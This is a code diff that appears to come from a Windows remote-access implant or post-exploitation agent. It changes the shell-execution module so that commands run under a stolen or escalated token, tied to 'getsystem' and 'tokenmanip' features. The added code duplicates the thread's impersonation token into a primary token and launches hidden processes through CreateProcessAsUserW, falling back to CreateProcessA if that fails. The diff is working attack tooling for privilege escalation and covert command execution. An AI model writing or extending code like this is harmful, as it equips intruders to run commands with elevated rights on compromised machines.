@@ -469,8 +469,52 @@ static void mod_shell_exec(Buffer *out, const char *cmd_line, BOOL use_powershel
 
     DBG("[shell] executing: %s", full_cmd);
 
-    if (!CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
-                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    /*
+     * If the thread is impersonating (getsystem / tokenmanip), use
+     * CreateProcessAsUserW so the child inherits the impersonated
+     * identity.  Fall back to plain CreateProcessA when not impersonating.
+     */
+    BOOL spawned = FALSE;
+    HANDLE hThreadToken = NULL;
+    if (OpenThreadToken(GetCurrentThread(),
+                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
+                        FALSE, &hThreadToken)) {
+        /* Duplicate as a primary token — CreateProcessAsUserW needs one */
+        HANDLE hPrimary = NULL;
+        if (DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
+                             SecurityImpersonation, TokenPrimary, &hPrimary)) {
+            /* CreateProcessAsUserW requires wide strings */
+            WCHAR wCmd[8192];
+            MultiByteToWideChar(CP_UTF8, 0, full_cmd, -1, wCmd, 8192);
+
+            STARTUPINFOW siw;
+            memset(&siw, 0, sizeof(siw));
+            siw.cb = sizeof(siw);
+            siw.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+            siw.hStdOutput = hStdoutWrite;
+            siw.hStdError  = hStderrWrite;
+            siw.hStdInput  = NULL;
+            siw.wShowWindow = SW_HIDE;
+
+            spawned = CreateProcessAsUserW(
+                hPrimary, NULL, wCmd, NULL, NULL, TRUE,
+                CREATE_NO_WINDOW, NULL, NULL, &siw, &pi);
+
+            if (!spawned) {
+                DBG("[shell] CreateProcessAsUserW failed (err=%lu), falling back",
+                    GetLastError());
+            }
+            CloseHandle(hPrimary);
+        }
+        CloseHandle(hThreadToken);
+    }
+
+    if (!spawned) {
+        spawned = CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
+                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    }
+
+    if (!spawned) {
         char err[256];
         snprintf(err, sizeof(err), "CreateProcess failed (err=%lu)\n", GetLastError());
         buf_append(out, err, (DWORD)strlen(err));
